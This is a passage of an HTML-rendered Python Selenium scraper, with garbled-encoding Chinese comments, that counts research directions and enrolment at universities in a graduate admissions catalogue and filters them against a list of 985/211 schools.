class=\"string\">@desc: å¯¹æ¯ä¸ªåŸå¸‚çš„é«˜æ ¡å¼€è®¾çš„ç ”ç©¶æ–¹å‘è¿›è¡Œå¤„ç†ï¼Œå¹¶æ‰“å°ç»“æœä¸­çš„985&amp;211é™¢æ ¡</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium <span class=\"keyword\">import</span> webdriver</span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium.webdriver.chrome.options <span class=\"keyword\">import</span> Options</span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium.webdriver.support.ui <span class=\"keyword\">import</span> Select</span><br><span class=\"line\"><span class=\"keyword\">from</span> pyecharts.charts <span class=\"keyword\">import</span> Line</span><br><span class=\"line\"><span class=\"keyword\">from</span> pyecharts <span class=\"keyword\">import</span> options <span class=\"keyword\">as</span> opts</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ReserachDirections</span><span class=\"params\">(object)</span>:</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, url, count, mldm, yjxkdm)</span>:</span></span><br><span class=\"line\">        self.url = url</span><br><span class=\"line\">        self.count = count</span><br><span class=\"line\">        self.mldm = mldm</span><br><span class=\"line\">        self.yjxkdm = yjxkdm</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># é…ç½® driver</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">set_driver</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        chrome_options = Options()</span><br><span class=\"line\">        chrome_options.add_argument(<span class=\"string\">\"--headless\"</span>)</span><br><span class=\"line\">        chrome_options.add_argument(<span class=\"string\">\"--disable-gpu\"</span>)</span><br><span class=\"line\">        driver = webdriver.Chrome(executable_path=<span class=\"string\">\"E:/Program Files/chromedriver_win32/chromedriver.exe\"</span>,</span><br><span class=\"line\">                                  chrome_options=chrome_options)</span><br><span class=\"line\">        driver.get(self.url)</span><br><span class=\"line\">        driver = self.set_height_width(driver)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> driver</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># å°†è®¾ç½®å±å¹•å¤§å°ç‹¬ç«‹å‡ºæ¥ï¼Œæ–¹ä¾¿æ¯æ¬¡è·³è½¬å®Œä½¿ç”¨</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">set_height_width</span><span class=\"params\">(self, driver)</span>:</span></span><br><span class=\"line\">        width = driver.execute_script(<span class=\"string\">\"return document.documentElement.scrollWidth\"</span>)</span><br><span class=\"line\">        height = driver.execute_script(<span class=\"string\">\"return document.documentElement.scrollHeight\"</span>)</span><br><span class=\"line\">        driver.set_window_size(width, height)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> driver</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># å¦‚æœéœ€è¦ç¿»é¡µå°±ç¿»é¡µ</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">paging</span><span class=\"params\">(self, driver)</span>:</span></span><br><span class=\"line\">        ul = driver.find_element_by_xpath(<span class=\"string\">\"//ul[@class='ch-page']\"</span>)</span><br><span class=\"line\">        li = ul.find_elements_by_xpath(<span class=\"string\">\"li\"</span>)</span><br><span class=\"line\">        <span class=\"comment\"># print(\"å½“å‰é¡µé¢ç¿»é¡µå…ƒç´ é•¿åº¦ï¼š\" + str(len(li)))</span></span><br><span class=\"line\">        <span class=\"comment\"># ç¬¬ä¸€é¡µå³ä¸‹è§’çš„æ ‡ç­¾æ•°é‡æœ€å¤§ä¸º10ï¼Œå°äº10æ—¶æ²¡æœ‰ Go è¾“å…¥è·³è½¬æ¡†</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(len(li) &lt; <span class=\"number\">10</span>):</span><br><span class=\"line\">            pagenumber = int(li[<span class=\"number\">-2</span>].text)</span><br><span class=\"line\">        <span class=\"comment\"># print(pagenumber)</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            pagenumber = int(li[<span class=\"number\">-3</span>].text)</span><br><span class=\"line\">        print(<span class=\"string\">\"å½“å‰é¡µæ•°ï¼š\"</span> + str(pagenumber))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> pagenumber</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># è·å¾—å½“å‰æ¡ä»¶ä¸‹çš„æ‰€æœ‰é«˜æ ¡åç§°,è¿”å›åç§°åˆ—è¡¨</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_school_name</span><span class=\"params\">(self, driver)</span>:</span></span><br><span class=\"line\">        pagenumber = self.paging(driver)</span><br><span class=\"line\">        name_list = []</span><br><span class=\"line\">        major_numbers_list = []</span><br><span class=\"line\">        number_list = []</span><br><span class=\"line\">        original_window = driver.current_window_handle</span><br><span class=\"line\">        flag = <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (pagenumber == <span class=\"number\">1</span>):</span><br><span class=\"line\">            numbers = driver.find_elements_by_xpath(<span class=\"string\">\"//tbody//tr\"</span>)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, len(numbers)+<span class=\"number\">1</span>):</span><br><span class=\"line\">                <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                    school_name = driver.find_element_by_xpath(<span class=\"string\">\"//tr[&#123;&#125;]//td[1]//form[1]//a[1]\"</span>.format(line)).get_attribute(<span class=\"string\">\"textContent\"</span>)</span><br><span class=\"line\">                    print(school_name)</span><br><span class=\"line\">                    name_list.append(school_name)</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\"># è·³è½¬åˆ°æ¯ä¸ªå­¦æ ¡å¯¹åº”çš„ç ”ç©¶æ–¹å‘ä¿¡æ¯é¡µé¢</span></span><br><span class=\"line\">                    driver.find_element_by_link_text(school_name).click()</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> window_handle <span class=\"keyword\">in</span> driver.window_handles:</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> window_handle != original_window:</span><br><span class=\"line\">                            driver.switch_to.window(window_handle)</span><br><span class=\"line\">                            <span class=\"keyword\">break</span></span><br><span class=\"line\">                    driver = self.set_height_width(driver)</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\"># å¾—åˆ°è¯¥å­¦æ ¡å„ä¸ªç ”ç©¶æ–¹å‘çš„åˆ—è¡¨</span></span><br><span class=\"line\">                    major_list ,number = self.get_major_info(driver)</span><br><span class=\"line\">                    major_numbers_list.append(major_list)</span><br><span class=\"line\">                    number_list.append(number)</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\"># å…³é—­ä¿¡æ¯é¡µé¢ï¼Œè½¬åˆ°å­¦æ ¡åˆ—è¡¨é¡µé¢</span></span><br><span class=\"line\">                    driver.close()</span><br><span class=\"line\">                    driver.switch_to.window(original_window)</span><br><span class=\"line\">                    driver = self.set_height_width(driver)</span><br><span class=\"line\">                <span class=\"keyword\">except</span>:</span><br><span class=\"line\">                    flag = <span class=\"literal\">False</span></span><br><span class=\"line\">                    print(<span class=\"string\">\"æŸ¥æ‰¾å¤±è´¥ï¼Œè¯·æ£€æŸ¥å½“å‰é¡µé¢æ˜¯å¦ä¸ºç©ºï¼\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> (pagenumber &lt; <span class=\"number\">7</span>):</span><br><span class=\"line\">            <span class=\"keyword\">while</span> (pagenumber):</span><br><span class=\"line\">                numbers = driver.find_elements_by_xpath(<span class=\"string\">\"//tbody//tr\"</span>)</span><br><span class=\"line\">                <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, len(numbers)+<span class=\"number\">1</span>):</span><br><span class=\"line\">                    school_name = driver.find_element_by_xpath(<span class=\"string\">\"//tr[&#123;&#125;]//td[1]//form[1]//a[1]\"</span>.format(line)).get_attribute(<span class=\"string\">\"textContent\"</span>)</span><br><span class=\"line\">                    name_list.append(school_name)</span><br><span class=\"line\">                    print(school_name)</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\"># è·³è½¬åˆ°æ¯ä¸ªå­¦æ ¡å¯¹åº”çš„ç ”ç©¶æ–¹å‘ä¿¡æ¯é¡µé¢</span></span><br><span class=\"line\">                    driver.find_element_by_link_text(school_name).click()</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> window_handle <span class=\"keyword\">in</span> driver.window_handles:</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> window_handle != original_window:</span><br><span class=\"line\">                            driver.switch_to.window(window_handle)</span><br><span class=\"line\">                            <span class=\"keyword\">break</span></span><br><span class=\"line\">                    driver = self.set_height_width(driver)</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\"># å¾—åˆ°è¯¥å­¦æ ¡å„ä¸ªç ”ç©¶æ–¹å‘çš„åˆ—è¡¨</span></span><br><span class=\"line\">                    major_list, number = self.get_major_info(driver)</span><br><span class=\"line\">                    major_numbers_list.append(major_list)</span><br><span class=\"line\">                    number_list.append(number)</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\"># å…³é—­ä¿¡æ¯é¡µé¢ï¼Œè½¬åˆ°å­¦æ ¡åˆ—è¡¨é¡µé¢</span></span><br><span class=\"line\">                    driver.close()</span><br><span class=\"line\">                    driver.switch_to.window(original_window)</span><br><span class=\"line\">                    driver = self.set_height_width(driver)</span><br><span class=\"line\"></span><br><span class=\"line\">                ul = driver.find_element_by_xpath(<span class=\"string\">\"//ul[@class='ch-page']\"</span>)</span><br><span class=\"line\">                li = ul.find_elements_by_xpath(<span class=\"string\">\"li\"</span>)</span><br><span class=\"line\">                li[<span class=\"number\">-1</span>].click()</span><br><span class=\"line\">                pagenumber -= <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># print(name_list)</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> name_list, major_numbers_list, number_list, flag</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># è·å¾—æŸä¸ªé™¢æ ¡åœ¨ç›®æ ‡ä¸“ä¸šä¸‹çš„ç ”ç©¶æ–¹å‘çš„æ•°é‡ï¼Œè¿”å›æ•°é‡åˆ—è¡¨</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_major_info</span><span class=\"params\">(self, driver)</span>:</span></span><br><span class=\"line\">        <span class=\"comment\"># å½“å‰ Tab é‡Œæœ‰å¤šå°‘ä¸ªé¡µé¢</span></span><br><span class=\"line\">        pagenumber = self.paging(driver)</span><br><span class=\"line\">        majors = <span class=\"number\">0</span></span><br><span class=\"line\">        all_number = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"comment\"># å®šä½è·³è½¬</span></span><br><span class=\"line\">        css_selector_jumpto = <span class=\"string\">\"body.ch-sticky:nth-child(2) \"</span> \\</span><br><span class=\"line\">                              <span class=\"string\">\"div.main-wrapper:nth-child(2) \"</span> \\</span><br><span class=\"line\">                              <span class=\"string\">\"div.container.clearfix:nth-child(5) \"</span> \\</span><br><span class=\"line\">                              <span class=\"string\">\"div.zsml-row.clearfix \"</span> \\</span><br><span class=\"line\">                              <span class=\"string\">\"div.zsml-page-box ul.ch-page \"</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(pagenumber == <span class=\"number\">1</span>):</span><br><span class=\"line\">            <span class=\"comment\"># ä¸ç”¨ä¸‹ä¸€é¡µæ“ä½œ</span></span><br><span class=\"line\">            major = driver.find_elements_by_xpath(<span class=\"string\">\"//tbody//tr\"</span>)</span><br><span class=\"line\">            print(<span class=\"string\">\"è¿™ä¸€é¡µçš„ä¸“ä¸šæ•°é‡\"</span> + str(len(major)))</span><br><span class=\"line\">            majors += len(major)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, len(major) + <span class=\"number\">1</span>):</span><br><span class=\"line\">                <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                    number = driver.find_element_by_xpath(<span class=\"string\">\"//tr[&#123;&#125;]//td[7]//a[1]\"</span>.format(i)).get_attribute(<span class=\"string\">\"data-title\"</span>)</span><br><span class=\"line\">                    numbers = re.sub(<span class=\"string\">r\"[^0-9]\"</span>, <span class=\"string\">\"\"</span>, number)</span><br><span class=\"line\">                    all_number += int(numbers)</span><br><span class=\"line\">                    print(<span class=\"string\">\"  æ‹Ÿæ‹›ç”Ÿï¼š\"</span> + numbers)</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                    print(e)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span>(pagenumber &lt; <span class=\"number\">7</span> ):</span><br><span class=\"line\">            <span class=\"comment\"># æ‰¾åˆ°ä¸‹ä¸€é¡µæŒ‰é’®</span></span><br><span class=\"line\">            <span class=\"keyword\">while</span>(pagenumber):</span><br><span class=\"line\">                <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                    major = driver.find_elements_by_xpath(<span class=\"string\">\"//tbody//tr\"</span>)</span><br><span class=\"line\">                    print(<span class=\"string\">\"è¿™ä¸€é¡µçš„ä¸“ä¸šæ•°é‡\"</span> + str(len(major)))</span><br><span class=\"line\">                    majors += len(major)</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, len(major) + <span class=\"number\">1</span>):</span><br><span class=\"line\">                        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                            number = driver.find_element_by_xpath(<span class=\"string\">\"//tr[&#123;&#125;]//td[7]//a[1]\"</span>.format(i)).get_attribute(</span><br><span class=\"line\">                                <span class=\"string\">\"data-title\"</span>)</span><br><span class=\"line\">                            numbers = re.sub(<span class=\"string\">r\"[^0-9]\"</span>, <span class=\"string\">\"\"</span>, number)</span><br><span class=\"line\">                            print(<span class=\"string\">\"  æ‹Ÿæ‹›ç”Ÿï¼š\"</span> + numbers)</span><br><span class=\"line\">                            all_number += int(numbers)</span><br><span class=\"line\">                        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                            print(e)</span><br><span class=\"line\">                <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                        print(e)</span><br><span class=\"line\">                ul = driver.find_element_by_css_selector(css_selector_jumpto)</span><br><span class=\"line\">                li = ul.find_elements_by_xpath(<span class=\"string\">\"li\"</span>)</span><br><span class=\"line\">                li[<span class=\"number\">-1</span>].click()</span><br><span class=\"line\">                pagenumber -= <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"comment\"># ä¸‹ä¸€é¡µæŒ‰é’®ä½ç½®ä¸åŒ,ç”¨ Go</span></span><br><span class=\"line\">            flag = <span class=\"number\">2</span>  <span class=\"comment\"># ä¸‹ä¸€æ¬¡è¦Goçš„é¡µç </span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">while</span>(pagenumber):</span><br><span class=\"line\">                <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                    major = driver.find_elements_by_xpath(<span class=\"string\">\"//tbody//tr\"</span>)</span><br><span class=\"line\">                    print(<span class=\"string\">\"è¿™ä¸€é¡µçš„ä¸“ä¸šæ•°é‡\"</span> + str(len(major)))</span><br><span class=\"line\">                    majors += len(major)</span><br><span class=\"line\">                <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                    print(e)</span><br><span class=\"line\">                driver.find_element_by_css_selector(<span class=\"string\">\"#goPageNo\"</span>).send_keys(str(flag))  <span class=\"comment\"># è¾“å…¥é¡µç è·³è½¬</span></span><br><span class=\"line\">                driver.find_element_by_xpath(<span class=\"string\">\"//input[@class='page-btn']\"</span>).click()  <span class=\"comment\"># ç‚¹å‡» Goï¼Œä»ç„¶åŒæ˜¯ä¸€ä¸ª window_handle</span></span><br><span class=\"line\">                pagenumber -= <span class=\"number\">1</span></span><br><span class=\"line\">                flag +=<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># print(len(major_list))</span></span><br><span class=\"line\">        print(<span class=\"string\">\"ä¸“ä¸šæ•°é‡ï¼š \"</span> + str(majors))</span><br><span class=\"line\">        print(<span class=\"string\">\"  å…±æ‹›ç”Ÿ: \"</span> + str(all_number))</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> majors, all_number</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># å¤é€‰æ¡†æ¡ä»¶é€‰æ‹©ï¼Œé€‰æ‹©åŸå¸‚ã€é—¨ç±»ã€å­¦ç§‘ç±»åˆ«</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">select_option</span><span class=\"params\">(self, driver)</span>:</span></span><br><span class=\"line\"></span><br><span class=\"line\">        school_list = []</span><br><span class=\"line\">        flag = <span class=\"literal\">True</span></span><br><span class=\"line\">        list_211 = [<span class=\"string\">'æ¸…åå¤§å­¦'</span>, <span class=\"string\">'åŒ—äº¬å¤§å­¦'</span>, <span class=\"string\">'ä¸­å›½äººæ°‘å¤§å­¦'</span>, <span class=\"string\">'åŒ—äº¬å·¥ä¸šå¤§å­¦'</span>, <span class=\"string\">'åŒ—äº¬ç†å·¥å¤§å­¦'</span>, <span class=\"string\">'åŒ—äº¬èˆªç©ºèˆªå¤©å¤§å­¦'</span>, <span class=\"string\">'åŒ—äº¬åŒ–å·¥å¤§å­¦'</span>,</span><br><span class=\"line\">                    <span class=\"string\">'åŒ—äº¬é‚®ç”µå¤§å­¦'</span>, <span class=\"string\">'å¯¹å¤–ç»æµè´¸æ˜“å¤§å­¦'</span>, <span class=\"string\">'ä¸­å›½ä¼ åª’å¤§å­¦'</span>, <span class=\"string\">'ä¸­å¤®æ°‘æ—å¤§å­¦'</span>, <span class=\"string\">'ä¸­å›½çŸ¿ä¸šå¤§å­¦'</span>, <span class=\"string\">'ä¸­å¤®è´¢ç»å¤§å­¦'</span>,</span><br><span class=\"line\">                    <span class=\"string\">'ä¸­å›½æ”¿æ³•å¤§å­¦'</span>, <span class=\"string\">'ä¸­å¤®éŸ³ä¹å­¦é™¢'</span>, <span class=\"string\">'åŒ—äº¬ä½“è‚²å¤§å­¦'</span>, <span class=\"string\">'åŒ—äº¬å¤–å›½è¯­å¤§å­¦'</span>, <span class=\"string\">'åŒ—äº¬äº¤é€šå¤§å­¦'</span>, <span class=\"string\">'åŒ—äº¬ç§‘æŠ€å¤§å­¦'</span>,</span><br><span class=\"line\">                    <span class=\"string\">'åŒ—äº¬æ—ä¸šå¤§å­¦'</span>, <span class=\"string\">'ä¸­å›½å†œä¸šå¤§å­¦'</span>, <span class=\"string\">'åŒ—äº¬ä¸­åŒ»è¯å¤§å­¦'</span>, <span class=\"string\">'ååŒ—ç”µåŠ›å¤§å­¦'</span>, <span class=\"string\">'åŒ—äº¬å¸ˆèŒƒå¤§å­¦'</span>, <span class=\"string\">'ä¸­å›½åœ°è´¨å¤§å­¦'</span>,</span><br><span class=\"line\">                    <span class=\"string\">'å¤æ—¦å¤§å­¦'</span>, <span class=\"string\">'åä¸œå¸ˆèŒƒå¤§å­¦'</span>, <span class=\"string\">'ä¸Šæµ·å¤–å›½è¯­å¤§å­¦'</span>, <span class=\"string\">'ä¸Šæµ·å¤§å­¦'</span>, <span class=\"string\">'åŒæµå¤§å­¦'</span>, <span class=\"string\">'åä¸œç†å·¥å¤§å­¦'</span>, <span class=\"string\">'ä¸œåå¤§å­¦'</span>,</span><br><span class=\"line\">                    <span class=\"string\">'ä¸Šæµ·è´¢ç»å¤§å­¦'</span>, <span class=\"string\">'ä¸Šæµ·äº¤é€šå¤§å­¦'</span>, <span class=\"string\">'å—å¼€å¤§å­¦'</span>, <span class=\"string\">'å¤©æ´¥å¤§å­¦'</span>, <span class=\"string\">'å¤©æ´¥åŒ»ç§‘å¤§å­¦'</span>, <span class=\"string\">'æ²³åŒ—å·¥ä¸šå¤§å­¦'</span>, <span class=\"string\">'é‡åº†å¤§å­¦'</span>,</span><br><span class=\"line\">                    <span class=\"string\">'è¥¿å—å¤§å­¦'</span>, <span class=\"string\">'å¤ªåŸç†å·¥å¤§å­¦'</span>, <span class=\"string\">'å†…è’™å¤å¤§å­¦'</span>, <span class=\"string\">'å¤§è¿ç†å·¥å¤§å­¦'</span>, <span class=\"string\">'ä¸œåŒ—å¤§å­¦'</span>, <span class=\"string\">'è¾½å®å¤§å­¦'</span>, <span class=\"string\">'å¤§è¿æµ·äº‹å¤§å­¦'</span>,</span><br><span class=\"line\">                    <span class=\"string\">'å‰æ—å¤§å­¦'</span>, <span class=\"string\">'ä¸œåŒ—å¸ˆèŒƒå¤§å­¦'</span>, <span class=\"string\">'å»¶è¾¹å¤§å­¦'</span>, <span class=\"string\">'ä¸œåŒ—å†œä¸šå¤§å­¦'</span>, <span class=\"string\">'ä¸œåŒ—æ—ä¸šå¤§å­¦'</span>, <span class=\"string\">'å“ˆå°”æ»¨å·¥ä¸šå¤§å­¦'</span>, <span class=\"string\">'å“ˆå°”æ»¨å·¥ç¨‹å¤§å­¦'</span>,</span><br><span class=\"line\">                    <span class=\"string\">'å—äº¬å¤§å­¦'</span>, <span class=\"string\">'ä¸œå—å¤§å­¦'</span>, <span class=\"string\">'è‹å·å¤§å­¦'</span>, <span class=\"string\">'æ²³æµ·å¤§å­¦'</span>, <span class=\"string\">'ä¸­å›½è¯ç§‘å¤§å­¦'</span>, <span class=\"string\">'å—äº¬å¸ˆèŒƒå¤§å­¦'</span>, <span class=\"string\">'å—äº¬ç†å·¥å¤§å­¦'</span>,</span><br><span class=\"line\">                    <span class=\"string\">'å—äº¬èˆªç©ºèˆªå¤©å¤§å­¦'</span>, <span class=\"string\">'æ±Ÿå—å¤§å­¦'</span>, <span class=\"string\">'å—äº¬å†œä¸šå¤§å­¦'</span>, <span class=\"string\">'æµ™æ±Ÿå¤§å­¦'</span>, <span class=\"string\">'å®‰å¾½å¤§å­¦'</span>, <span class=\"string\">'åˆè‚¥å·¥ä¸šå¤§å­¦'</span>, <span class=\"string\">'ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦'</span>,</span><br><span class=\"line\">                    <span class=\"string\">'å¦é—¨å¤§å­¦'</span>, <span class=\"string\">'ç¦å·å¤§å­¦'</span>, <span class=\"string\">'å—æ˜Œå¤§å­¦'</span>, <span class=\"string\">'å±±ä¸œå¤§å­¦'</span>, <span class=\"string\">'ä¸­å›½æµ·æ´‹å¤§å­¦'</span>, <span class=\"string\">'ä¸­å›½çŸ³æ²¹å¤§å­¦'</span>, <span class=\"string\">'éƒ‘å·å¤§å­¦'</span>, <span class=\"string\">'æ­¦æ±‰å¤§å­¦'</span>,</span><br><span class=\"line\">                    <span class=\"string\">'åä¸­ç§‘æŠ€å¤§å­¦'</span>, <span class=\"string\">'åä¸­å¸ˆèŒƒå¤§å­¦'</span>, <span class=\"string\">'åä¸­å†œä¸šå¤§å­¦'</span>, <span class=\"string\">'ä¸­å—è´¢ç»æ”¿æ³•å¤§å­¦'</span>, <span class=\"string\">'æ­¦æ±‰ç†å·¥å¤§å­¦'</span>, <span class=\"string\">'æ¹–å—å¤§å­¦'</span>, <span class=\"string\">'ä¸­å—å¤§å­¦'</span>,</span><br><span class=\"line\">                    <span class=\"string\">'æ¹–å—å¸ˆèŒƒå¤§å­¦'</span>, <span class=\"string\">'ä¸­å±±å¤§å­¦'</span>, <span class=\"string\">'æš¨å—å¤§å­¦'</span>, <span class=\"string\">'åå—ç†å·¥å¤§å­¦'</span>, <span class=\"string\">'åå—å¸ˆèŒƒå¤§å­¦'</span>, <span class=\"string\">'å¹¿è¥¿å¤§å­¦'</span>, <span class=\"string\">'å››å·å¤§å­¦'</span>, <span class=\"string\">'è¥¿å—äº¤é€šå¤§å­¦'</span>,</span><br><span class=\"line\">                    <span class=\"string\">'ç”µå­ç§‘æŠ€å¤§å­¦'</span>, <span class=\"string\">'è¥¿å—è´¢ç»å¤§å­¦'</span>, <span class=\"string\">'å››å·å†œä¸šå¤§å­¦'</span>, <span class=\"string\">'äº‘å—å¤§å­¦'</span>, <span class=\"string\">'è´µå·å¤§å­¦'</span>, <span class=\"string\">'è¥¿åŒ—å¤§å­¦'</span>, <span class=\"string\">'è¥¿å®‰äº¤é€šå¤§å­¦'</span>,</span><br><span class=\"line\">                    <span class=\"string\">'è¥¿åŒ—å·¥ä¸šå¤§å­¦'</span>, <span class=\"string\">'é™•è¥¿å¸ˆèŒƒå¤§å­¦'</span>, <span class=\"string\">'è¥¿åŒ—å†œæ—ç§‘å¤§'</span>, <span class=\"string\">'è¥¿å®‰ç”µå­ç§‘æŠ€å¤§å­¦'</span>, <span class=\"string\">'é•¿å®‰å¤§å­¦'</span>, <span class=\"string\">'å…°å·å¤§å­¦'</span>, <span class=\"string\">'æ–°ç–†å¤§å­¦'</span>,</span><br><span class=\"line\">                    <span class=\"string\">'çŸ³æ²³å­å¤§å­¦'</span>, <span class=\"string\">'æµ·å—å¤§å­¦'</span>, <span class=\"string\">'å®å¤å¤§å­¦'</span>, <span class=\"string\">'é’æµ·å¤§å­¦'</span>, <span class=\"string\">'è¥¿è—å¤§å­¦'</span>, <span class=\"string\">'ç¬¬äºŒå†›åŒ»å¤§å­¦'</span>, <span class=\"string\">'ç¬¬å››å†›åŒ»å¤§å­¦'</span>, <span class=\"string\">'å›½é˜²ç§‘å­¦æŠ€æœ¯å¤§å­¦'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># https://selenium-python-zh.readthedocs.io/en/latest/api.html</span></span><br><span class=\"line\">        <span class=\"comment\"># ä½¿ç”¨ Select å¤„ç†ä¸‹æ‹‰æ¡†çš„é€‰é¡¹</span></span><br><span class=\"line\">        <span class=\"comment\"># å…ˆé€šè¿‡ Xpath æ‰¾åˆ° select æ ‡ç­¾ï¼Œç„¶åé€šè¿‡ value æ‰¾åˆ°å¯¹åº”å€¼å³å¯é€‰æ‹©</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            <span class=\"comment\"># print(\"å½“å‰æ­£åœ¨é€‰æ‹©çš„åŸå¸‚ä»£ç ä¸ºï¼š \" + self.count)</span></span><br><span class=\"line\">            Select(driver.find_element_by_xpath(<span class=\"string\">\"//select[@id='ssdm']\"</span>)).select_by_value(self.count)</span><br><span class=\"line\">            Select(driver.find_element_by_xpath(<span class=\"string\">\"//select[@id='mldm']\"</span>)).select_by_value(self.mldm)</span><br><span class=\"line\">            Select(driver.find_element_by_xpath(<span class=\"string\">\"//select[@id='yjxkdm']\"</span>)).select_by_value(self.yjxkdm)</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># æ‰¾åˆ°æŸ¥è¯¢æŒ‰é’®è¿›è¡Œç‚¹å‡»,è¿›å…¥é«˜æ ¡åˆ—è¡¨ç•Œé¢</span></span><br><span class=\"line\">            <span class=\"comment\"># ç‚¹å‡»å®Œè¿˜æ˜¯åœ¨ä¸€ä¸ª tab é‡Œï¼Œ handle ä¹Ÿä¸€æ ·</span></span><br><span class=\"line\">            driver.find_element_by_xpath(<span class=\"string\">\"//input[@name='button']\"</span>).click()</span><br><span class=\"line\">            self.set_height_width(driver)</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># å¾—åˆ°é«˜æ ¡åˆ—è¡¨</span></span><br><span class=\"line\">            school_name_list, major_numbers_list, number_list, flag= self.get_school_name(driver)</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">for</span> school <span class=\"keyword\">in</span> school_name_list:</span><br><span class=\"line\">                school = school[<span class=\"number\">7</span>::]</span><br><span class=\"line\">                school_list.append(school)</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"é€‰æ‹©æ¡ä»¶å‡ºç°é”™è¯¯ï¼Œè¯·æ£€æŸ¥é—¨ç±»ä»£ç ä¸å­¦ç§‘ç±»åˆ«ä»£ç å¯¹åº”å…³ç³»æ˜¯å¦æ­£ç¡®ï¼ç¨‹åºå³å°†é€€å‡º...\"</span>.rjust(<span class=\"number\">50</span>, <span class=\"string\">'*'</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">        empty = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> school_list:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> list_211:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> i == j:</span><br><span class=\"line\"></span><br><span class=\"line\">                    empty.append(i)</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">        print(<span class=\"string\">\"å½“å‰æ¡ä»¶ä¸‹ï¼Œ985&amp;211 é™¢æ ¡æœ‰ï¼š\"</span>)</span><br><span class=\"line\">        